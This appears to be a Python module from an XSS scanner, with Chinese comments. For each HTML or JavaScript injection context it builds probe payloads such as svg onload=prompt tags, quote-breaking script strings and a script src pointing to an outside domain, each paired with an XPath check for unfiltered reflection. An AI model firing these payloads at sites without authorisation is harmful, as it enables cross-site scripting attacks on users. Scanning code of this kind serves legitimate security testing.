# coding=utf-8

# xss payload生成器
def payload_generate(context):
    payloads = []

    if context == "attribute_name":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "\"><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

        combine = dict()
        # 检测能否通过空格添加新属性
        combine['payload'] = " onload=prompt`812132` "
        combine['find'] = "//*[@onload[contains(.,812132)]]"
        payloads.append(combine)

    if context == "attribute_value":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "\"><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

        combine = dict()
        # 检测是否过滤单双引号
        combine['payload'] = "'\" onload=prompt`812132` "
        combine['find'] = "//*[@onload[contains(.,812132)]]"
        payloads.append(combine)

    if context == "html_tag":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "<svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

    if context == "html_comment":
        combine = dict()
        # 检测是否能逃逸出注释符
        combine['payload'] = "––><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

    if context == "script":
        combine = dict()
        # 检测script标签内容是否就是注入的payload
        combine['payload'] = "prompt`812132`;"
        combine['find'] = "//script[contains(text(),\"prompt`812132`;\")]"
        payloads.append(combine)

    if context == "script_attribute":
        combine = dict()
        # 检测是否可以加载任意域的JS文件
        combine['payload'] = "\" src=\"https://test.com\" \""
        combine['find'] = "//script[@src[contains(.,\"https://test.com\")]]"
        payloads.append(combine)

    if context == "script_single_quote":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "</script><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

        combine = dict()
        # 检测是否过滤单引号
        combine['payload'] = "'); prompt`812132`;//"
        combine['find'] = "//script[contains(text(),'" + combine['payload'] + "')]"
        payloads.append(combine)

    if context == "script_double_quote":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "</script><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

        combine = dict()
        # 检测是否过滤双引号
        combine['payload'] = "\"); prompt`812132`;//"
        combine['find'] = "//script[contains(text(),'" + combine['payload'] + "')]"
        payloads.append(combine)

    if context == "on_attribute":
        combine = dict()
        # 检测是否过滤尖括号 < >
        combine['payload'] = "\"><svg onload=prompt`812132`>"
        combine['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(combine)

        combine = dict()
        # 检测是否过滤单双引号
        combine['payload'] = "\"prompt`812132`"
        combine['find'] = '//*[@*[contains(.,812132)]]'
        payloads.append(combine)

    return payloads
